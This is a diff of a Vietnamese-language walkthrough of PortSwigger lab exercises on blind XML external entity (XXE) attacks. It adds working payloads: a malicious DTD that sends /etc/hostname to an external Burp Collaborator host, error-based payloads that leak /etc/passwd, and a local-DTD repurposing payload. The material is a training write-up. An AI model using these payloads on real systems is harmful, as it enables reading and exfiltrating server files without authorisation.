@@ -306,7 +306,7 @@ Truy cập bài lab chúng ta thấy 1 trang web bán hàng với chức năng c
 ==> 
 
 <!ENTITY % file SYSTEM "file:///etc/hostname">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://1acs5ag6ih0n3r1mby5ouosz8qei27.burpcollaborator.net/?x=%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://8luiimejfgly1q6a5g8ardcwlnrdf2.burpcollaborator.net/?x=%file;'>">
 %eval;
 %exfil;
 ```
@@ -320,13 +320,114 @@ Vậy là chúng ta đã chuẩn bị xong 1 malicious DTD, tiếp theo tới vi
 ==>
 
 
-
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-ac541f241fc9ab3380d418b3013f00d0.web-security-academy.net/exploit.dtd"> %xxe;]>
 
 ```
 
 
+Sau đó chèn vào request và tấn công như hình thức cơ bản, tiếp theo truy cập Burp Collaboration poll data về và chúng ta sẽ có được giá trị của /etc/hostname 
 
 
+
+
+
+### Lab: Exploiting blind XXE to retrieve data via error messages
+```
+This lab has a "Check stock" feature that parses XML input but does not display the result.
+
+To solve the lab, use an external DTD to trigger an error message that displays the contents of the /etc/passwd file.
+
+The lab contains a link to an exploit server on a different domain where you can host your malicious DTD.
+```
+
+Bài lab đã mô tả rằng chúng ta phải khai thác vào phần kích hoạt lỗi của website> Một cách tiếp cận khác để khai thác XXE mù là kích hoạt lỗi phân tích cú pháp XML trong đó thông báo lỗi chứa dữ liệu nhạy cảm mà bạn muốn truy xuất. Điều này sẽ có hiệu lực nếu ứng dụng trả về thông báo lỗi kết quả trong phản hồi của nó.
+
+
+
+Dựa vào đó chúng ta làm tương tự như bài lab trên, tuy nhiên phần client sẽ là 1 client không tồn tại = > điều này sẽ dẫn đến lỗi được kích hoạt và tin nhắn lỗi trả về cũng giá 
+trị file mà mình mong muốn.
+
+
+```
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
+%eval;
+%exfil;
+
+
+
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-acfb1fdd1e72c07780708c0d01210056.web-security-academy.net/exploit.dtd"> %xxe;]>
+```
+
+
+
+###  Lab: Exploiting XXE to retrieve data by repurposing a local DTD
+
+```
+This lab has a "Check stock" feature that parses XML input but does not display the result.
+
+To solve the lab, trigger an error message containing the contents of the /etc/passwd file.
+
+You'll need to reference an existing DTD file on the server and redefine an entity from it.
+```
+
+
+Bài lab mô tả rằng chúng ta sẽ kích hoạt lỗi và trả về file passwd, tuy nhiên lần này chúng ta không tự viết file malicious DTD nữa mà sẽ sử dụng file có sẳn trên hệ thống.
+
+Vì cuộc tấn công XXE này liên quan đến việc định vị lại một DTD hiện có trên hệ thống tệp máy chủ, yêu cầu chính là xác định vị trí tệp phù hợp. Điều này thực sự khá đơn giản. Vì 
+ứng dụng trả về bất kỳ thông báo lỗi nào do trình phân tích cú pháp XML ném ra, bạn có thể dễ dàng liệt kê các tệp DTD cục bộ chỉ bằng cách cố gắng tải chúng từ bên trong DTD nội 
+bộ.
+
+
+Chúng ta có thể kiểm tra thử xem file DTD có tồn tại hay không bằng cách chuyển payload này vào request và xem thử : 
+
+```
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+%local_dtd;
+]>
+```
+
+Sau khi xác định được file DTD cần thiết chúng ta tiến hành exploit. Đối với kỹ thuật trước chúng ta chỉ có thể áp dụng với file malicious phía bên ngoài, lần này chúng ta khai thác bằng file local nên sẽ khác. CHúng ta dựa trên format sau để tạo payload phù hợp khi đã xác định được file DTD local:
+
+
+```
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
+<!ENTITY % custom_entity '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+
+This DTD carries out the following steps:
+
+ + Defines an XML parameter entity called local_dtd, containing the contents of the external DTD 
+file that exists on the server filesystem.
+ + Redefines the XML parameter entity called custom_entity, which is already defined in the external
+DTD file. The entity is redefined as containing the error-based XXE exploit that was already described,
+for triggering an error message containing the contents of the /etc/passwd file.
+ + Uses the local_dtd entity, so that the external DTD is interpreted, including the redefined value of
+the custom_entity entity. This results in the desired error message.
+
+```
+
+Từ format trên chúng ta có thể suy ra được payload cần thiết như sau : 
+```
+<!DOCTYPE message [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+<!ENTITY % ISOamso '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///hellomotherfucker/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+```
 
 
 
